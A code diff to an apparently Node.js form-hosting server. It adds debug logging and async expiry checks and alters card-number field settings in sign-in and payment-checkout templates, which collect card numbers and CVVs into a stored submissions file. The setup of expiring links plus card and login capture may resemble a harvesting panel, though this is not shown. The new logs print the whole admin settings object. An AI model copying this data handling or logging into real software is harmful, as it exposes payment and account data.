@@ -947,19 +947,29 @@ function sanitizeForJs(str) {
 // Utility to check if form is expired
 async function isFormExpired(formId) {
   const config = formConfigs[formId];
-  if (!config || !config.createdAt) return true;
+  if (!config || !config.createdAt) {
+    console.log(`Form ${formId} not found or missing createdAt`);
+    return true;
+  }
   
   const adminSettings = await loadAdminSettings();
-  if (!adminSettings.linkLifespan) return false;
+  if (!adminSettings.linkLifespan) {
+    console.log(`No linkLifespan set for form ${formId}, assuming not expired`);
+    return false;
+  }
   
   const createdTime = new Date(config.createdAt).getTime();
   const currentTime = Date.now();
-  return (currentTime - createdTime) > adminSettings.linkLifespan;
+  const isExpired = (currentTime - createdTime) > adminSettings.linkLifespan;
+  console.log(`Form ${formId} expiration check: createdAt=${config.createdAt}, currentTime=${currentTime}, linkLifespan=${adminSettings.linkLifespan}, isExpired=${isExpired}`);
+  return isExpired;
 }
 
 // Utility to count user's forms
 async function countUserForms(userId) {
-  return Object.values(formConfigs).filter(config => config.userId === userId).length;
+  const count = Object.values(formConfigs).filter(config => config.userId === userId).length;
+  console.log(`Counted ${count} forms for user ${userId}`);
+  return count;
 }
 
 // Auth Route: Get current user info
@@ -1194,19 +1204,42 @@ app.post('/admin/settings', verifyAdminPassword, async (req, res) => {
 app.get('/get', verifyToken, async (req, res) => {
   try {
     const userId = req.user.userId;
-    const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
+    console.log(`Processing /get request for user ${userId}`);
+
+    // Load submissions
+    let submissions = [];
+    try {
+      const data = await fs.readFile(submissionsFile, 'utf8');
+      submissions = JSON.parse(data);
+      console.log(`Loaded ${submissions.length} total submissions from ${submissionsFile}`);
+    } catch (error) {
+      console.error('Error reading submissions file:', error.message);
+      submissions = [];
+    }
+
     const adminSettings = await loadAdminSettings();
-    
+    console.log(`Loaded admin settings:`, adminSettings);
+
     // Filter submissions by user
     const userSubmissions = submissions.filter(s => s.userId === userId);
-    
+    console.log(`Filtered ${userSubmissions.length} submissions for user ${userId}`);
+
     // Filter form configs by user and check for expiration
     const userFormConfigs = {};
-    Object.entries(formConfigs).forEach(([formId, config]) => {
-      if (config.userId === userId && !isFormExpired(formId)) {
-        userFormConfigs[formId] = config;
+    const expiredForms = [];
+    const validForms = [];
+    for (const [formId, config] of Object.entries(formConfigs)) {
+      if (config.userId === userId) {
+        const isExpired = await isFormExpired(formId);
+        if (isExpired) {
+          expiredForms.push(formId);
+        } else {
+          userFormConfigs[formId] = config;
+          validForms.push(formId);
+        }
       }
-    });
+    }
+    console.log(`User ${userId} forms: ${validForms.length} valid (${validForms.join(', ')}), ${expiredForms.length} expired (${expiredForms.join(', ')})`);
 
     const templates = {
       'sign-in': {
@@ -1233,14 +1266,22 @@ app.get('/get', verifyToken, async (req, res) => {
       }
     };
     
-    console.log(`Retrieved ${userSubmissions.length} submissions and ${Object.keys(userFormConfigs).length} forms for user ${userId}`);
-    res.json({
+    const responseData = {
       submissions: userSubmissions.reverse(),
       formConfigs: userFormConfigs,
       templates,
       userId,
       maxFormsPerUser: adminSettings.maxFormsPerUser
+    };
+    console.log(`Returning data for user ${userId}:`, {
+      submissionCount: responseData.submissions.length,
+      formConfigCount: Object.keys(responseData.formConfigs).length,
+      templateKeys: Object.keys(responseData.templates),
+      userId: responseData.userId,
+      maxFormsPerUser: responseData.maxFormsPerUser
     });
+
+    res.json(responseData);
   } catch (error) {
     console.error('Error fetching data for /get:', error.message, error.stack);
     res.status(500).json({ error: 'Failed to fetch data', details: error.message });
@@ -1410,7 +1451,7 @@ app.post('/form/:id/submit', async (req, res) => {
       'payment-checkout': {
         name: 'Payment Checkout Form',
         fields: [
-          { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: true, regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
+          { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: 'true', regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
           { id: 'exp-date', placeholder: 'Expiration Date (MM/YY)', type: 'text', validation: { required: true } },
           { id: 'cvv', placeholder: 'CVV', type: 'text', validation: { required: true } }
         ]
@@ -1551,7 +1592,7 @@ app.get('/submissions', verifyToken, async (req, res) => {
       'payment-checkout': {
         name: 'Payment Checkout Form',
         fields: [
-          { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: true, regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
+          { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: 'true', regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
           { id: 'exp-date', placeholder: 'Expiration Date (MM/YY)', type: 'text', validation: { required: true } },
           { id: 'cvv', placeholder: 'CVV', type: 'text', validation: { required: true } }
         ]
@@ -1610,7 +1651,7 @@ app.get('/form/:id', async (req, res) => {
     'payment-checkout': {
       name: 'Payment Checkout Form',
       fields: [
-        { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: true, regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
+        { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: 'true', regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
         { id: 'exp-date', placeholder: 'Expiration Date (MM/YY)', type: 'text', validation: { required: true } },
         { id: 'cvv', placeholder: 'CVV', type: 'text', validation: { required: true } }
       ],
